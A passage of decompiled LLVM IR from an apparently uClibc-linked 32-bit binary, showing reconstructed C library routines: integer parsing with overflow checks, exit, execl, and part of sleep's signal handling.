  br i1 %v1_804d26d, label %dec_label_pc_804d293, label %dec_label_pc_804d26f

dec_label_pc_804d26f:                             ; preds = %dec_label_pc_804d265
  %v1_804d26f = add i32 %arg3, 10
  store i32 %v1_804d26f, i32* %esi.global-to-local, align 4
  %v1_804d272 = inttoptr i32 %v0_804d277 to i8*
  %v2_804d272 = load i8, i8* %v1_804d272, align 1
  %v8_804d272 = icmp eq i8 %v2_804d272, 48
  %v1_804d275 = icmp eq i1 %v8_804d272, false
  br i1 %v1_804d275, label %dec_label_pc_804d289, label %dec_label_pc_804d277

dec_label_pc_804d277:                             ; preds = %dec_label_pc_804d26f
  %v1_804d277 = add i32 %v0_804d277, 1
  store i32 %v1_804d277, i32* %ebx.global-to-local, align 4
  %v1_804d278 = add i32 %arg3, 8
  store i32 %v1_804d278, i32* %esi.global-to-local, align 4
  %v1_804d27d = inttoptr i32 %v1_804d277 to i8*
  %v2_804d27d = load i8, i8* %v1_804d27d, align 1
  %v3_804d27d = zext i8 %v2_804d27d to i32
  %v5_804d27d = and i32 %v3_804d246.lcssa, -256
  %v6_804d27d = or i32 %v5_804d27d, %v3_804d27d
  %v1_804d27f = or i32 %v6_804d27d, 32
  %v3_804d27f = trunc i32 %v1_804d27f to i8
  store i32 %v1_804d27f, i32* %eax.global-to-local, align 4
  %v10_804d282 = icmp eq i8 %v3_804d27f, 120
  %v1_804d284 = icmp eq i1 %v10_804d282, false
  br i1 %v1_804d284, label %dec_label_pc_804d289, label %dec_label_pc_804d286

dec_label_pc_804d286:                             ; preds = %dec_label_pc_804d277
  %v2_804d286 = mul i32 %v1_804d278, 2
  store i32 %v2_804d286, i32* %esi.global-to-local, align 4
  %v1_804d288 = add i32 %v0_804d277, 2
  store i32 %v1_804d288, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d289

dec_label_pc_804d289:                             ; preds = %dec_label_pc_804d277, %dec_label_pc_804d26f, %dec_label_pc_804d286
  %v0_804d2b212 = phi i32 [ %v1_804d277, %dec_label_pc_804d277 ], [ %v0_804d277, %dec_label_pc_804d26f ], [ %v1_804d288, %dec_label_pc_804d286 ]
  %v0_804d30920 = phi i32 [ %v1_804d277, %dec_label_pc_804d277 ], [ %v4_804d239, %dec_label_pc_804d26f ], [ %v1_804d277, %dec_label_pc_804d286 ]
  %v0_804d289 = phi i32 [ %v1_804d278, %dec_label_pc_804d277 ], [ %v1_804d26f, %dec_label_pc_804d26f ], [ %v2_804d286, %dec_label_pc_804d286 ]
  %v7_804d28c = icmp sgt i32 %v0_804d289, 16
  br i1 %v7_804d28c, label %dec_label_pc_804d28e, label %dec_label_pc_804d293

dec_label_pc_804d28e:                             ; preds = %dec_label_pc_804d289
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804d293

dec_label_pc_804d293:                             ; preds = %dec_label_pc_804d289, %dec_label_pc_804d265, %dec_label_pc_804d28e
  %v0_804d30921 = phi i32 [ %v0_804d30920, %dec_label_pc_804d289 ], [ %v4_804d239, %dec_label_pc_804d265 ], [ %v0_804d30920, %dec_label_pc_804d28e ]
  %v0_804d2b213 = phi i32 [ %v0_804d2b212, %dec_label_pc_804d289 ], [ %v0_804d277, %dec_label_pc_804d265 ], [ %v0_804d2b212, %dec_label_pc_804d28e ]
  %v0_804d2a2 = phi i32 [ %v0_804d289, %dec_label_pc_804d289 ], [ %arg3, %dec_label_pc_804d265 ], [ 16, %dec_label_pc_804d28e ]
  %v1_804d293 = add i32 %v0_804d2a2, -2
  store i32 %v1_804d293, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_804d29b = icmp ugt i32 %v1_804d293, 34
  br i1 %v6_804d29b, label %dec_label_pc_804d2fe, label %dec_label_pc_804d29d

dec_label_pc_804d29d:                             ; preds = %dec_label_pc_804d293
  %div = udiv i32 -1, %v0_804d2a2
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_804d2a2
  %v1_804d2a4 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_804d2de = urem i32 %arg4, 256
  br label %dec_label_pc_804d2b2

dec_label_pc_804d2b0:                             ; preds = %dec_label_pc_804d2f4, %dec_label_pc_804d2de
  %v4_804d2b2.pre = phi i32 [ %v1_804d2c8, %dec_label_pc_804d2f4 ], [ %v4_804d2b2.pre.pre, %dec_label_pc_804d2de ]
  %v0_804d2b0 = phi i32 [ %v1_804d2cf, %dec_label_pc_804d2f4 ], [ %v0_804d2b0.pre, %dec_label_pc_804d2de ]
  br label %dec_label_pc_804d2b2

dec_label_pc_804d2b2:                             ; preds = %dec_label_pc_804d29d, %dec_label_pc_804d2b0
  %v0_804d30919 = phi i32 [ %v0_804d30921, %dec_label_pc_804d29d ], [ %v0_804d2b0, %dec_label_pc_804d2b0 ]
  %v0_804d2cf = phi i32 [ %v0_804d2b213, %dec_label_pc_804d29d ], [ %v0_804d2b0, %dec_label_pc_804d2b0 ]
  %v4_804d2b2 = phi i32 [ %div, %dec_label_pc_804d29d ], [ %v4_804d2b2.pre, %dec_label_pc_804d2b0 ]
  %v1_804d2b2 = inttoptr i32 %v0_804d2cf to i8*
  %v2_804d2b2 = load i8, i8* %v1_804d2b2, align 1
  %v3_804d2b2 = zext i8 %v2_804d2b2 to i32
  %v5_804d2b2 = and i32 %v4_804d2b2, -256
  %v6_804d2b2 = or i32 %v3_804d2b2, %v5_804d2b2
  store i32 %v6_804d2b2, i32* %eax.global-to-local, align 4
  %v1_804d2b4 = add i32 %v6_804d2b2, -48
  store i32 %v1_804d2b4, i32* @ecx, align 4
  %v1_804d2b7 = trunc i32 %v1_804d2b4 to i8
  %tmp55 = icmp ult i8 %v1_804d2b7, 10
  br i1 %tmp55, label %dec_label_pc_804d2c8, label %dec_label_pc_804d2bc

dec_label_pc_804d2bc:                             ; preds = %dec_label_pc_804d2b2
  %v1_804d2bc = or i32 %v6_804d2b2, 32
  %v3_804d2bc = trunc i32 %v1_804d2bc to i8
  store i32 %v1_804d2bc, i32* %eax.global-to-local, align 4
  %v1_804d2bf = and i32 %v1_804d2b4, -256
  %v2_804d2bf = or i32 %v1_804d2bf, 40
  store i32 %v2_804d2bf, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_804d2bc, 97
  br i1 %tmp56, label %dec_label_pc_804d2c8, label %dec_label_pc_804d2c5

dec_label_pc_804d2c5:                             ; preds = %dec_label_pc_804d2bc
  %v1_804d2c5 = add i32 %v1_804d2bc, -87
  store i32 %v1_804d2c5, i32* @ecx, align 4
  br label %dec_label_pc_804d2c8

dec_label_pc_804d2c8:                             ; preds = %dec_label_pc_804d2bc, %dec_label_pc_804d2b2, %dec_label_pc_804d2c5
  %v0_804d2f7 = phi i32 [ %v2_804d2bf, %dec_label_pc_804d2bc ], [ %v1_804d2b4, %dec_label_pc_804d2b2 ], [ %v1_804d2c5, %dec_label_pc_804d2c5 ]
  %v1_804d2c8 = urem i32 %v0_804d2f7, 256
  store i32 %v1_804d2c8, i32* %eax.global-to-local, align 4
  %v1_804d2cb = load i32, i32* %esi.global-to-local, align 4
  %v2_804d2cb = sub i32 %v1_804d2c8, %v1_804d2cb
  %v10_804d2cb = and i32 %v2_804d2cb, %v1_804d2cb
  %v11_804d2cb = icmp slt i32 %v10_804d2cb, 0
  %v13_804d2cb = icmp slt i32 %v2_804d2cb, 0
  %v2_804d2cd = icmp eq i1 %v13_804d2cb, %v11_804d2cb
  br i1 %v2_804d2cd, label %dec_label_pc_804d2fe, label %dec_label_pc_804d2cf

dec_label_pc_804d2cf:                             ; preds = %dec_label_pc_804d2c8
  %v1_804d2cf = add i32 %v0_804d2cf, 1
  store i32 %v1_804d2cf, i32* %ebx.global-to-local, align 4
  %v0_804d2d0 = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_804d2d0, %div
  br i1 %tmp57, label %dec_label_pc_804d2de, label %dec_label_pc_804d2d6

dec_label_pc_804d2d6:                             ; preds = %dec_label_pc_804d2cf
  %v15_804d2d0 = icmp eq i32 %v0_804d2d0, %div
  %v1_804d2d6 = icmp eq i1 %v15_804d2d0, false
  br i1 %v1_804d2d6, label %dec_label_pc_804d2f4, label %dec_label_pc_804d2d8

dec_label_pc_804d2d8:                             ; preds = %dec_label_pc_804d2d6
  %v1_804d2d8 = trunc i32 %v0_804d2f7 to i8
  %tmp58 = icmp ugt i8 %v1_804d2d8, %v1_804d2a4
  br i1 %tmp58, label %dec_label_pc_804d2de, label %dec_label_pc_804d2f4

dec_label_pc_804d2de:                             ; preds = %dec_label_pc_804d2d8, %dec_label_pc_804d2cf
  store i32 %v4_804d2de, i32* %eax.global-to-local, align 4
  %v0_804d2e2 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804d2e2 = and i32 %v0_804d2e2, %v4_804d2de
  store i32 %v2_804d2e2, i32* %ebp.global-to-local, align 4
  %v1_804d2e4 = call i32 @__errno_location(i32 %div)
  store i32 %v1_804d2e4, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_804d2ec = inttoptr i32 %v1_804d2e4 to i32*
  store i32 34, i32* %v1_804d2ec, align 4
  %v0_804d2b0.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804d2b2.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d2b0

dec_label_pc_804d2f4:                             ; preds = %dec_label_pc_804d2d8, %dec_label_pc_804d2d6
  %v4_804d2f4 = mul i32 %v0_804d2d0, %v1_804d2cb
  store i32 %v1_804d2c8, i32* %eax.global-to-local, align 4
  %v2_804d2fa = add i32 %v4_804d2f4, %v1_804d2c8
  store i32 %v2_804d2fa, i32* @edx, align 4
  br label %dec_label_pc_804d2b0

dec_label_pc_804d2fe:                             ; preds = %dec_label_pc_804d2c8, %dec_label_pc_804d293
  %v0_804d309 = phi i32 [ %v0_804d30921, %dec_label_pc_804d293 ], [ %v0_804d30919, %dec_label_pc_804d2c8 ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_804d293 ], [ %div, %dec_label_pc_804d2c8 ]
  %v4_804d2fe = icmp eq i32 %arg2, 0
  br i1 %v4_804d2fe, label %dec_label_pc_804d30b, label %dec_label_pc_804d305

dec_label_pc_804d305:                             ; preds = %dec_label_pc_804d2fe
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804d309 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804d309, i32* %v2_804d309, align 4
  br label %dec_label_pc_804d30b

dec_label_pc_804d30b:                             ; preds = %dec_label_pc_804d2fe, %dec_label_pc_804d305
  %v0_804d30b = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_804d30b, i32* %eax.global-to-local, align 4
  %v1_804d30d = trunc i32 %v0_804d30b to i8
  %v6_804d30d = icmp eq i8 %v1_804d30d, 0
  %v2_804d30f = zext i1 %v6_804d30d to i32
  %v1_804d3114 = or i32 %v2_804d30f, -2147483648
  store i32 %v1_804d3114, i32* %ebx.global-to-local, align 4
  %v5_804d317 = icmp eq i8 %tmp37, 0
  br i1 %v5_804d317, label %dec_label_pc_804d32f, label %dec_label_pc_804d31e

dec_label_pc_804d31e:                             ; preds = %dec_label_pc_804d30b
  %v0_804d31e = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_804d31e, %v1_804d3114
  br i1 %tmp59, label %dec_label_pc_804d322, label %dec_label_pc_804d32f

dec_label_pc_804d322:                             ; preds = %dec_label_pc_804d31e
  %v1_804d322 = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_804d322, i32* %eax.global-to-local, align 4
  %v0_804d327 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804d327, i32* @edx, align 4
  %v1_804d329 = inttoptr i32 %v1_804d322 to i32*
  store i32 34, i32* %v1_804d329, align 4
  %v0_804d32f.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804d32f

dec_label_pc_804d32f:                             ; preds = %dec_label_pc_804d31e, %dec_label_pc_804d30b, %dec_label_pc_804d322
  %v0_804d32f = phi i32 [ %v0_804d30b, %dec_label_pc_804d31e ], [ %v0_804d30b, %dec_label_pc_804d30b ], [ %v0_804d32f.pre, %dec_label_pc_804d322 ]
  store i32 %v0_804d32f, i32* %eax.global-to-local, align 4
  %v3_804d331 = trunc i32 %v0_804d32f to i8
  %v4_804d331 = icmp eq i8 %v3_804d331, 0
  %v0_804d33a.pre = load i32, i32* @edx, align 4
  br i1 %v4_804d331, label %dec_label_pc_804d337, label %dec_label_pc_804d335

dec_label_pc_804d335:                             ; preds = %dec_label_pc_804d32f
  %v1_804d335 = sub i32 0, %v0_804d33a.pre
  store i32 %v1_804d335, i32* @edx, align 4
  br label %dec_label_pc_804d337

dec_label_pc_804d337:                             ; preds = %dec_label_pc_804d32f, %dec_label_pc_804d335
  %v0_804d33a = phi i32 [ %v1_804d335, %dec_label_pc_804d335 ], [ %v0_804d33a.pre, %dec_label_pc_804d32f ]
  store i32 %v0_804d33a, i32* %eax.global-to-local, align 4
  %v2_804d33c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d33c, i32* @ebx, align 4
  ret i32 %v0_804d33a

; uselistorder directives
  uselistorder i32 %v0_804d33a, { 1, 0 }
  uselistorder i32 %v0_804d32f, { 1, 0 }
  uselistorder i32 %v0_804d2d0, { 0, 2, 1 }
  uselistorder i32 %v1_804d2cf, { 1, 0 }
  uselistorder i32 %v2_804d2cb, { 1, 0 }
  uselistorder i32 %v1_804d2c8, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_804d2f7, { 1, 0 }
  uselistorder i32 %v0_804d2b0, { 1, 0 }
  uselistorder i32 %v4_804d2de, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_804d2a2, { 1, 0, 2 }
  uselistorder i32 %v2_804d286, { 1, 0 }
  uselistorder i32 %v1_804d27f, { 1, 0 }
  uselistorder i32 %v1_804d278, { 1, 0, 2 }
  uselistorder i32 %v0_804d277, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_804d246.lcssa, { 1, 0 }
  uselistorder i32 %v0_804d245.lcssa, { 1, 0 }
  uselistorder i32 %v1_804d245, { 0, 3, 2, 1 }
  uselistorder i32 %v4_804d239, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_804d233, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -17, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d337, { 1, 0 }
  uselistorder label %dec_label_pc_804d32f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d30b, { 1, 0 }
  uselistorder label %dec_label_pc_804d2c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d2b2, { 1, 0 }
  uselistorder label %dec_label_pc_804d293, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d289, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d265, { 1, 0 }
  uselistorder label %dec_label_pc_804d264, { 1, 0 }
  uselistorder label %dec_label_pc_804d245, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804d357 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804d357, i32* @ebx, align 4
  %v2_804d35c = call i32 @__pthread_return_void(i32 %v2_804d357, i32 134534955)
  %v1_804d368 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054300.374 to i32))
  %v0_804d36d = load i32, i32* @global_var_80569c4.375, align 4
  store i32 %v0_804d36d, i32* @eax, align 4
  %v1_804d375 = icmp eq i32 %v0_804d36d, 0
  br i1 %v1_804d375, label %dec_label_pc_804d382, label %dec_label_pc_804d379

dec_label_pc_804d379:                             ; preds = %entry
  %v0_804d37c = load i32, i32* @esi, align 4
  %v1_804d37d = call i32 @unknown_0(i32 %v0_804d37c)
  store i32 %v1_804d37d, i32* @eax, align 4
  br label %dec_label_pc_804d382

dec_label_pc_804d382:                             ; preds = %entry, %dec_label_pc_804d379
  %v2_804d387 = call i32 @__pthread_return_void(i32 %v2_804d357, i32 1)
  %v0_804d38c = call i32 @__GI___uClibc_fini()
  %v0_804d39d = call i32 @_stdio_term()
  %v0_804d3a5 = load i32, i32* @esi, align 4
  %v1_804d3a6 = call i32 @__GI__exit(i32 %v0_804d3a5)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d382, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804d3b0 = load i32, i32* @ebx, align 4
  store i32 %v0_804d3b0, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804d3b3 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_804d3b3, i32* %eax.global-to-local, align 4
  %v12_804d3b6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804d3bc

dec_label_pc_804d3bc:                             ; preds = %dec_label_pc_804d3bc, %entry
  %v0_804d3bf = phi i32 [ 0, %entry ], [ %v1_804d3bf, %dec_label_pc_804d3bc ]
  %stack_var_-16.0 = phi i32 [ %v2_804d3b3, %entry ], [ %v1_804d3c0, %dec_label_pc_804d3bc ]
  %v1_804d3bf = add i32 %v0_804d3bf, 1
  store i32 %v1_804d3bf, i32* %esi.global-to-local, align 4
  %v1_804d3c0 = add i32 %stack_var_-16.0, 4
  store i32 %v1_804d3c0, i32* %eax.global-to-local, align 4
  %v1_804d3c6 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_804d3c6 = load i32, i32* %v1_804d3c6, align 4
  %v3_804d3c6 = icmp eq i32 %v2_804d3c6, 0
  %v1_804d3c9 = icmp eq i1 %v3_804d3c6, false
  br i1 %v1_804d3c9, label %dec_label_pc_804d3bc, label %dec_label_pc_804d3cb

dec_label_pc_804d3cb:                             ; preds = %dec_label_pc_804d3bc
  %v1_804d3cb = mul i32 %v1_804d3bf, 4
  %v2_804d3cb = add i32 %v1_804d3cb, 34
  %v1_804d3d2 = and i32 %v2_804d3cb, -16
  %v2_804d3d5 = sub i32 %v12_804d3b6, %v1_804d3d2
  %v1_804d3da = add i32 %v2_804d3d5, 15
  %v1_804d3de = and i32 %v1_804d3da, -16
  store i32 %v1_804d3de, i32* @ebx, align 4
  store i32 %v1_804d3de, i32* %ecx.global-to-local, align 4
  %v2_804d3e3 = inttoptr i32 %v1_804d3de to i32*
  store i32 %arg2, i32* %v2_804d3e3, align 16
  store i32 %v2_804d3b3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d3eb

dec_label_pc_804d3eb:                             ; preds = %dec_label_pc_804d3eb, %dec_label_pc_804d3cb
  %stack_var_-16.1 = phi i32 [ %v2_804d3b3, %dec_label_pc_804d3cb ], [ %v1_804d3f2, %dec_label_pc_804d3eb ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_804d3ee = load i32, i32* %ecx.global-to-local, align 4
  %v1_804d3ee = add i32 %v0_804d3ee, 4
  store i32 %v1_804d3ee, i32* %ecx.global-to-local, align 4
  %v0_804d3f1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804d3f1 = add i32 %v0_804d3f1, -1
  %v8_804d3f1 = icmp eq i32 %v1_804d3f1, 0
  store i32 %v1_804d3f1, i32* %esi.global-to-local, align 4
  %v1_804d3f2 = add i32 %stack_var_-16.1, 4
  %v1_804d3f8 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_804d3f8 = load i32, i32* %v1_804d3f8, align 4
  store i32 %v2_804d3f8, i32* %eax.global-to-local, align 4
  %v2_804d3fa = inttoptr i32 %v1_804d3ee to i32*
  store i32 %v2_804d3f8, i32* %v2_804d3fa, align 4
  %v1_804d3fc = icmp eq i1 %v8_804d3f1, false
  br i1 %v1_804d3fc, label %dec_label_pc_804d3eb, label %dec_label_pc_804d3fe

dec_label_pc_804d3fe:                             ; preds = %dec_label_pc_804d3eb
  %v0_804d3fe = load i32, i32* %eax.global-to-local, align 4
  %v1_804d3fe = load i32, i32* @esp, align 4
  %v2_804d3fe = add i32 %v1_804d3fe, -4
  %v3_804d3fe = inttoptr i32 %v2_804d3fe to i32*
  store i32 %v0_804d3fe, i32* %v3_804d3fe, align 4
  %v0_804d3ff = load i32, i32* @global_var_80569cc.376, align 4
  %v2_804d3ff = add i32 %v1_804d3fe, -8
  %v3_804d3ff = inttoptr i32 %v2_804d3ff to i32*
  store i32 %v0_804d3ff, i32* %v3_804d3ff, align 4
  %v0_804d405 = load i32, i32* @ebx, align 4
  %v2_804d405 = add i32 %v1_804d3fe, -12
  %v3_804d405 = inttoptr i32 %v2_804d405 to i32*
  store i32 %v0_804d405, i32* %v3_804d405, align 4
  %v5_804d406 = add i32 %v1_804d3fe, -16
  %v6_804d406 = inttoptr i32 %v5_804d406 to i32*
  store i32 %arg1, i32* %v6_804d406, align 4
  %v1_804d409 = inttoptr i32 %v1_804d3f2 to i8*
  %v2_804d409 = call i32 @__GI_execve(i8* %v1_804d409)
  store i32 %v2_804d409, i32* %eax.global-to-local, align 4
  %v2_804d411 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d411, i32* @ebx, align 4
  ret i32 %v2_804d409

; uselistorder directives
  uselistorder i32 %v1_804d3f1, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_804d3c0, { 1, 0 }
  uselistorder i32 %v1_804d3bf, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804d3b3, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_804d418 = load i32, i32* @ebp, align 4
  %v0_804d419 = load i32, i32* @edi, align 4
  %v0_804d41a = load i32, i32* @esi, align 4
  %v0_804d41b = load i32, i32* @ebx, align 4
  %v15_804d41c = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_804d42e = icmp eq i32 %arg1, 0
  %v1_804d430 = icmp eq i1 %v1_804d42e, false
  br i1 %v1_804d430, label %dec_label_pc_804d442.preheader, label %dec_label_pc_804d58f

dec_label_pc_804d442.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d437

dec_label_pc_804d437:                             ; preds = %dec_label_pc_804d437.dec_label_pc_804d437_crit_edge, %dec_label_pc_804d442.preheader
  %v0_804d437 = phi i32 [ %v15_804d41c, %dec_label_pc_804d442.preheader ], [ %v0_804d437.pre, %dec_label_pc_804d437.dec_label_pc_804d437_crit_edge ]
  %v1_804d44229 = phi i32 [ 31, %dec_label_pc_804d442.preheader ], [ %v1_804d442, %dec_label_pc_804d437.dec_label_pc_804d437_crit_edge ]
  %v2_804d437 = mul i32 %v1_804d44229, 4
  %v3_804d437 = add i32 %v2_804d437, 292
  %v4_804d437 = add i32 %v3_804d437, %v0_804d437
  %v5_804d437 = inttoptr i32 %v4_804d437 to i32*
  store i32 0, i32* %v5_804d437, align 4
  %v0_804d442.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804d442 = add i32 %v0_804d442.pre, -1
  %v9_804d442 = icmp slt i32 %v1_804d442, 0
  store i32 %v1_804d442, i32* %eax.global-to-local, align 4
  %v1_804d443 = icmp eq i1 %v9_804d442, false
  br i1 %v1_804d443, label %dec_label_pc_804d437.dec_label_pc_804d437_crit_edge, label %dec_label_pc_804d445

dec_label_pc_804d437.dec_label_pc_804d437_crit_edge: ; preds = %dec_label_pc_804d437
  %v0_804d437.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d437

dec_label_pc_804d445:                             ; preds = %dec_label_pc_804d437
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804d45b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804d45b, i32* @ebx, align 4
  store i32 %v2_804d45b, i32* %stack_var_-460, align 4
  %v4_804d463 = call i32 @__sigaddset(i32 %v2_804d45b, i32 17, i32 %v1_804d442, i32 %v1_804d442)
  store i32 %v4_804d463, i32* %eax.global-to-local, align 4
  %v2_804d46b = icmp slt i32 %v4_804d463, 0
  br i1 %v2_804d46b, label %dec_label_pc_804d593, label %dec_label_pc_804d473

dec_label_pc_804d473:                             ; preds = %dec_label_pc_804d445
  %v2_804d474 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_804d474, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_804d47f = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_804d47f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_804d47f, i32 %v2_804d474)
  store i32 %v4_804d47f, i32* %eax.global-to-local, align 4
  %v1_804d487 = icmp eq i32 %v4_804d47f, 0
  %v1_804d489 = icmp eq i1 %v1_804d487, false
  br i1 %v1_804d489, label %dec_label_pc_804d593, label %dec_label_pc_804d48f

dec_label_pc_804d48f:                             ; preds = %dec_label_pc_804d473
  store i32 %v2_804d474, i32* %stack_var_-460, align 4
  %v4_804d494 = call i32 @__sigismember(i32 %v2_804d474, i32 17, i32 %v4_804d47f, i32 %v4_804d47f)
  store i32 %v4_804d494, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_804d4a1 = icmp eq i32 %v4_804d494, 0
  br i1 %v1_804d4a1, label %dec_label_pc_804d4b5.preheader, label %dec_label_pc_804d55d

dec_label_pc_804d4b5.preheader:                   ; preds = %dec_label_pc_804d48f
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d4aa

dec_label_pc_804d4aa:                             ; preds = %dec_label_pc_804d4aa.dec_label_pc_804d4aa_crit_edge, %dec_label_pc_804d4b5.preheader
  %v0_804d4aa = phi i32 [ %v15_804d41c, %dec_label_pc_804d4b5.preheader ], [ %v0_804d4aa.pre, %dec_label_pc_804d4aa.dec_label_pc_804d4aa_crit_edge ]
  %v1_804d4b528 = phi i32 [ 31, %dec_label_pc_804d4b5.preheader ], [ %v1_804d4b5, %dec_label_pc_804d4aa.dec_label_pc_804d4aa_crit_edge ]
  %v2_804d4aa = mul i32 %v1_804d4b528, 4
  %v3_804d4aa = add i32 %v2_804d4aa, 292
  %v4_804d4aa = add i32 %v3_804d4aa, %v0_804d4aa
  %v5_804d4aa = inttoptr i32 %v4_804d4aa to i32*
  store i32 0, i32* %v5_804d4aa, align 4
  %v0_804d4b5.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_804d4b5 = add i32 %v0_804d4b5.pre, -1
  %v9_804d4b5 = icmp slt i32 %v1_804d4b5, 0
  store i32 %v1_804d4b5, i32* %edx.global-to-local, align 4
  %v1_804d4b6 = icmp eq i1 %v9_804d4b5, false
  br i1 %v1_804d4b6, label %dec_label_pc_804d4aa.dec_label_pc_804d4aa_crit_edge, label %dec_label_pc_804d4b8

dec_label_pc_804d4aa.dec_label_pc_804d4aa_crit_edge: ; preds = %dec_label_pc_804d4aa
  %v0_804d4aa.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d4aa

dec_label_pc_804d4b8:                             ; preds = %dec_label_pc_804d4aa
  store i32 %v2_804d45b, i32* %eax.global-to-local, align 4
  store i32 %v2_804d45b, i32* %stack_var_-460, align 4
  %v4_804d4c4 = call i32 @__sigaddset(i32 %v2_804d45b, i32 17, i32 0, i32 0)
  store i32 %v4_804d4c4, i32* %eax.global-to-local, align 4
  %v2_804d4cc = icmp slt i32 %v4_804d4c4, 0
  br i1 %v2_804d4cc, label %dec_label_pc_804d593, label %dec_label_pc_804d4d4

dec_label_pc_804d4d4:                             ; preds = %dec_label_pc_804d4b8
  %v2_804d4d5 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_804d4d5, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_804d4de = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_804d4d5)
  store i32 %v4_804d4de, i32* %eax.global-to-local, align 4
  %v2_804d4e6 = icmp slt i32 %v4_804d4de, 0
  %v1_804d4e8 = icmp eq i1 %v2_804d4e6, false
  br i1 %v1_804d4e8, label %dec_label_pc_804d512, label %dec_label_pc_804d4ea

dec_label_pc_804d4ea:                             ; preds = %dec_label_pc_804d4d4
  %v0_804d4ea = load i32, i32* %stack_var_-460, align 4
